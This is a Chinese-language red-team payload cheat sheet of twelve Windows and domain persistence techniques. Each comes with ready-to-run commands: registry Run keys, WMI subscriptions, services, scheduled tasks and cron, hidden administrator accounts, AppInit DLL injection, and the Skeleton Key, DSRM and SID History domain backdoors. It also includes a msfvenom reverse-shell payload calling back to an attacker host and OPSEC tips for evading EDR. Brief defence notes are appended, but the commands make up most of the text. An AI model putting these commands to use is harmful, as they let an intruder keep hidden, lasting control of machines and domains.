# 权限维持

_12 条 intranet payload_

### 注册表持久化  `persistence-registry`
_通过注册表实现权限维持_
子类：**注册表** · tags: `persistence` `registry` `windows` `autorun`

**前置条件：**
- 已获得目标机器权限
- 管理员权限
- Windows系统

**攻击链：**

**Run键持久化**
> 添加Run键实现开机自启
_platform: windows_
```
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\Users\Public\backdoor.exe" /f
```

**RunOnce键**
> RunOnce键，执行一次后删除
_platform: windows_
```
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v Backdoor /t REG_SZ /d "C:\backdoor.exe" /f
```

**Winlogon Helper**
> 修改Userinit实现持久化
_platform: windows_
```
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /t REG_SZ /d "C:\Windows\system32\userinit.exe,C:\backdoor.exe" /f
```

**服务持久化**
> 创建服务实现持久化
_platform: windows_
```
sc create Backdoor binPath= "C:\backdoor.exe" start= auto
```

**EDR 绕过变体：**

**隐藏注册表键**
> 使用空字节隐藏注册表键
```
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\x00" /v Backdoor /t REG_SZ /d "C:\backdoor.exe" /f
```


**分析：** 注册表持久化会在系统启动或用户登录时执行恶意程序。

**OPSEC 提示：**
- Run键是最常见的持久化方式，容易被检测
- 考虑使用更隐蔽的方式
- 定期检查注册表异常项

**概述：** Windows注册表提供了多种持久化机制，攻击者可以在系统启动或用户登录时自动执行恶意代码。

**漏洞原理：** Windows注册表中的多个键值可以在特定时机自动执行程序，这是系统设计功能，但可被攻击者滥用。

**利用方法：** 利用流程：1) 获取管理员权限；2) 选择持久化位置；3) 添加恶意程序路径；4) 等待系统重启或用户登录；5) 恶意程序自动执行。

**防御措施：** 防御措施：1) 监控注册表关键键值变化；2) 使用白名单限制程序执行；3) 定期审计持久化项；4) 部署EDR检测异常行为。

---

### WMI持久化  `persistence-wmi`
_通过WMI事件订阅实现持久化_
子类：**WMI** · tags: `wmi` `persistence` `windows`

**前置条件：**
- 管理员权限

**攻击链：**

**创建事件过滤器**
> 创建WMI事件过滤器
_platform: windows_
```
$filter = New-WmiEventFilter -Name "evil" -Query "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
```

**创建事件消费者**
> 创建命令行消费者
_platform: windows_
```
$consumer = New-WmiEventConsumer -Name "evil" -CommandLineTemplate "powershell -e BASE64_CMD"
```

**绑定过滤器和消费者**
> 绑定触发执行
_platform: windows_
```
New-WmiFilterToConsumerBinding -Filter $filter -Consumer $consumer
```


**概述：** WMI事件订阅可以实现隐蔽的持久化。

**漏洞原理：** WMI允许创建自动执行的事件。

**利用方法：** 利用流程：1) 创建过滤器 2) 创建消费者 3) 绑定执行

**防御措施：** 防御措施：1) 监控WMI事件 2) 审计WMI仓库

---

### 启动文件夹持久化  `persistence-startup`
_通过启动文件夹实现持久化_
子类：**启动文件夹** · tags: `startup` `persistence` `windows`

**前置条件：**
- 写入权限

**攻击链：**

**当前用户启动文件夹**
> 当前用户启动
_platform: windows_
```
copy evil.lnk "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
```

**所有用户启动文件夹**
> 所有用户启动
_platform: windows_
```
copy evil.lnk "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\"
```


**概述：** 启动文件夹的程序会在用户登录时执行。

**漏洞原理：** 启动文件夹可写。

**利用方法：** 利用流程：1) 找到启动文件夹 2) 放置恶意文件 3) 等待用户登录

**防御措施：** 防御措施：1) 监控启动文件夹 2) 限制写入权限

---

### 服务持久化  `persistence-service`
_通过创建服务实现持久化_
子类：**服务** · tags: `service` `persistence` `windows`

**前置条件：**
- 管理员权限

**攻击链：**

**创建服务**
> 创建自启动服务
_platform: windows_
```
sc create evilsvc binPath= "cmd /c powershell -e BASE64_CMD" start= auto
```
**语法解析：**
- `sc create` — 创建服务命令 _command_
- `binPath=` — 服务执行路径 _parameter_
- `start= auto` — 自动启动 _parameter_

**启动服务**
> 启动服务
_platform: windows_
```
sc start evilsvc
```


**概述：** 服务可以在系统启动时自动执行。

**漏洞原理：** 服务可以配置执行任意命令。

**利用方法：** 利用流程：1) 创建服务 2) 配置自动启动 3) 重启触发

**防御措施：** 防御措施：1) 监控服务创建 2) 审计服务配置

---

### DLL注入持久化  `persistence-dll-injection`
_通过DLL注入实现持久化_
子类：**DLL注入** · tags: `dll` `injection` `persistence`

**前置条件：**
- 代码执行权限
- 目标进程

**攻击链：**

**创建恶意DLL**
> 生成恶意DLL
_platform: linux_
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=attacker LPORT=4444 -f dll > evil.dll
```

**注入DLL**
> 将DLL注入到运行进程
_platform: windows_
```
使用工具如InjectDLL、PowerShell等注入到目标进程
```

**AppInit_DLLs**
> 通过AppInit_DLLs注入
_platform: windows_
```
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" /v AppInit_DLLs /t REG_SZ /d "C:\evil.dll" /f
```


**概述：** DLL注入可以将代码注入到其他进程执行。

**漏洞原理：** 进程可以加载任意DLL。

**利用方法：** 利用流程：1) 创建DLL 2) 注入目标进程 3) 执行代码

**防御措施：** 防御措施：1) 启用CFG 2) 监控DLL加载 3) 使用签名验证

---

### 后门用户  `persistence-backdoor-user`
_创建后门用户账户_
子类：**用户** · tags: `user` `backdoor` `persistence`

**前置条件：**
- 管理员权限

**攻击链：**

**创建用户**
> 创建管理员用户
_platform: windows_
```
net user backdoor P@ssw0rd /add
net localgroup administrators backdoor /add
```

**隐藏用户**
> 创建隐藏用户（$结尾）
_platform: windows_
```
net user backdoor$ P@ssw0rd /add
```

**修改注册表隐藏**
> 通过注册表隐藏用户
_platform: windows_
```
reg add "HKLM\SAM\SAM\Domains\Account\Users\Names\backdoor$" /f
```


**概述：** 创建后门用户可以持久访问系统。

**漏洞原理：** 管理员可以创建用户。

**利用方法：** 利用流程：1) 创建用户 2) 添加到管理员组 3) 隐藏用户

**防御措施：** 防御措施：1) 监控用户创建 2) 定期审计用户列表

---

### 隐藏用户  `persistence-hidden-user`
_创建隐藏的管理员用户_
子类：**隐藏用户** · tags: `hidden` `user` `persistence`

**前置条件：**
- SYSTEM权限

**攻击链：**

**创建用户**
> 创建$结尾用户
_platform: windows_
```
net user hidden$ P@ssw0rd /add
```

**添加到管理员组**
> 添加管理员权限
_platform: windows_
```
net localgroup administrators hidden$ /add
```

**注册表隐藏**
> 通过注册表完全隐藏
_platform: windows_
```
reg export "HKLM\SAM\SAM\Domains\Account\Users\000003E9" user.reg
修改F值
reg import user.reg
```


**概述：** 隐藏用户不会在登录界面和用户列表显示。

**漏洞原理：** 注册表可以修改用户显示属性。

**利用方法：** 利用流程：1) 创建用户 2) 修改注册表 3) 完全隐藏

**防御措施：** 防御措施：1) 监控注册表修改 2) 深度审计用户

---

### 计划任务持久化  `persistence-scheduled`
_通过计划任务实现持久化_
子类：**计划任务** · tags: `persistence` `scheduled` `task`

**前置条件：**
- 创建任务权限

**攻击链：**

**创建登录任务**
> 创建登录时运行的任务
_platform: windows_
```
schtasks /create /tn "Backdoor" /tr "C:\backdoor.exe" /sc onlogon /ru SYSTEM
```
**语法解析：**
- `/tn` — 任务名称 _parameter_
- `/tr` — 执行的程序 _parameter_
- `/sc onlogon` — 触发条件：登录时 _parameter_
- `/ru SYSTEM` — 运行用户：SYSTEM _parameter_

**创建定时任务**
> 创建每5分钟运行的任务
_platform: windows_
```
schtasks /create /tn "Backdoor" /tr "C:\backdoor.exe" /sc minute /mo 5
```

**PowerShell创建**
> 使用PowerShell创建任务
_platform: windows_
```
$action = New-ScheduledTaskAction -Execute "C:\backdoor.exe"
$trigger = New-ScheduledTaskTrigger -AtLogon
Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "Backdoor" -User "System"
```

**Linux Cron**
> Linux计划任务
_platform: linux_
```
crontab -e
添加: * * * * * /tmp/backdoor.sh
或: @reboot /tmp/backdoor.sh
```


**概述：** 计划任务是常用的持久化方式。

**漏洞原理：** 计划任务可被创建执行任意程序。

**利用方法：** 利用流程：1) 创建任务 2) 设置触发器 3) 等待执行

**防御措施：** 防御措施：1) 监控任务创建 2) 审计任务变更 3) 限制创建权限

---

### Skeleton Key后门  `skeleton-key`
_在域控制器植入万能密码_
子类：**域后门** · tags: `skeleton-key` `backdoor` `domain`

**前置条件：**
- 域管理员权限
- 访问域控制器

**攻击链：**

**植入Skeleton Key**
> 使用Mimikatz植入
_platform: windows_
```
mimikatz # privilege::debug
mimikatz # misc::skeleton
```
**语法解析：**
- `misc::skeleton` — 植入万能密码模块 _command_

**使用万能密码**
> 使用万能密码登录
_platform: windows_
```
万能密码: mimikatz
任何域用户都可以使用mimikatz作为密码登录
```

**检测方法**
> 检测Skeleton Key
_platform: windows_
```
检查LSASS内存:
Get-Process lsass
使用EDR检测内存注入
```


**概述：** Skeleton Key在内存中植入万能密码，不影响原密码。

**漏洞原理：** 域控制器LSASS可被注入。

**利用方法：** 利用流程：1) 获取域管权限 2) 访问DC 3) 植入后门

**防御措施：** 防御措施：1) 保护DC 2) 监控LSASS 3) 使用Credential Guard

---

### DSRM后门  `dsrm-backdoor`
_利用DSRM账户建立后门_
子类：**域后门** · tags: `dsrm` `backdoor` `domain`

**前置条件：**
- 域管理员权限
- 访问域控制器

**攻击链：**

**获取DSRM密码**
> 获取DSRM账户哈希
_platform: windows_
```
mimikatz # lsadump::lsa /patch /name:krbtgt
或
mimikatz # token::elevate
mimikatz # lsadump::sam
```

**同步DSRM密码**
> 同步DSRM密码与域管理员
_platform: windows_
```
ntdsutil
set dsrm password
sync from domain account admin
q
q
```
**语法解析：**
- `ntdsutil` — AD数据库工具 _command_
- `sync from domain account` — 同步域账户密码 _keyword_

**启用DSRM账户**
> 允许DSRM账户远程登录
_platform: windows_
```
修改注册表:
New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD
```

**使用DSRM登录**
> 使用DSRM账户
_platform: windows_
```
使用DSRM账户哈希:
mimikatz # sekurlsa::pth /domain:DC_NAME /user:Administrator /ntlm:HASH
或使用Pass-the-Hash
```


**概述：** DSRM是域控制器的本地管理员账户，可作为后门使用。

**漏洞原理：** DSRM账户独立于域账户，常被忽视。

**利用方法：** 利用流程：1) 获取DSRM哈希 2) 同步密码 3) 启用远程登录

**防御措施：** 防御措施：1) 监控DSRM密码变更 2) 检查注册表 3) 定期审计

---

### SID History后门  `sid-history`
_利用SID History建立后门_
子类：**域后门** · tags: `sid-history` `backdoor` `domain`

**前置条件：**
- 域管理员权限

**攻击链：**

**添加SID History**
> 添加SID History
_platform: windows_
```
mimikatz # sid::add /sam:backdoor_user /new:administrator
将域管SID添加到普通用户
```
**语法解析：**
- `sid::add` — 添加SID History _command_
- `/sam` — 目标用户 _parameter_
- `/new` — 要添加的SID _parameter_

**验证SID History**
> 检查SID History
_platform: windows_
```
Get-ADUser backdoor_user -Properties sidHistory
或
whoami /all
```

**使用后门**
> 使用后门账户
_platform: windows_
```
使用backdoor_user登录
自动获得域管理员权限
```


**概述：** SID History允许用户继承其他用户的权限。

**漏洞原理：** SID History可被滥用添加额外权限。

**利用方法：** 利用流程：1) 创建普通用户 2) 添加域管SID 3) 获得域管权限

**防御措施：** 防御措施：1) 监控SID History 2) 审计用户属性 3) 使用PAM

---

### 进程镂空持久化  `persistence-process-hollowing`
_利用进程镂空技术实现持久化_
子类：**进程注入** · tags: `process-hollowing` `persistence` `injection`

**前置条件：**
- 代码执行权限

**攻击链：**

**进程镂空原理**
> 进程镂空原理
_platform: windows_
```
1. 创建合法进程(挂起状态)
2. 替换进程内存
3. 恢复执行
```

**C#实现**
> C#进程镂空
_platform: windows_
```
using System.Runtime.InteropServices;
// 创建挂起进程
CreateProcess("C:\\Windows\\System32\\svchost.exe", ..., CREATE_SUSPENDED, ...);
// 替换内存
NtUnmapViewOfSection(...);
VirtualAllocEx(...);
WriteProcessMemory(...);
ResumeThread(...);
```

**检测方法**
> 检测进程镂空
_platform: windows_
```
检查进程内存:
- 进程路径与内存内容不匹配
- 异常的内存区域
- 使用EDR检测
```


**概述：** 进程镂空将恶意代码注入合法进程。

**漏洞原理：** Windows进程创建机制可被利用。

**利用方法：** 利用流程：1) 创建挂起进程 2) 替换内存 3) 恢复执行

**防御措施：** 防御措施：1) 使用EDR 2) 监控进程创建 3) 内存扫描

---
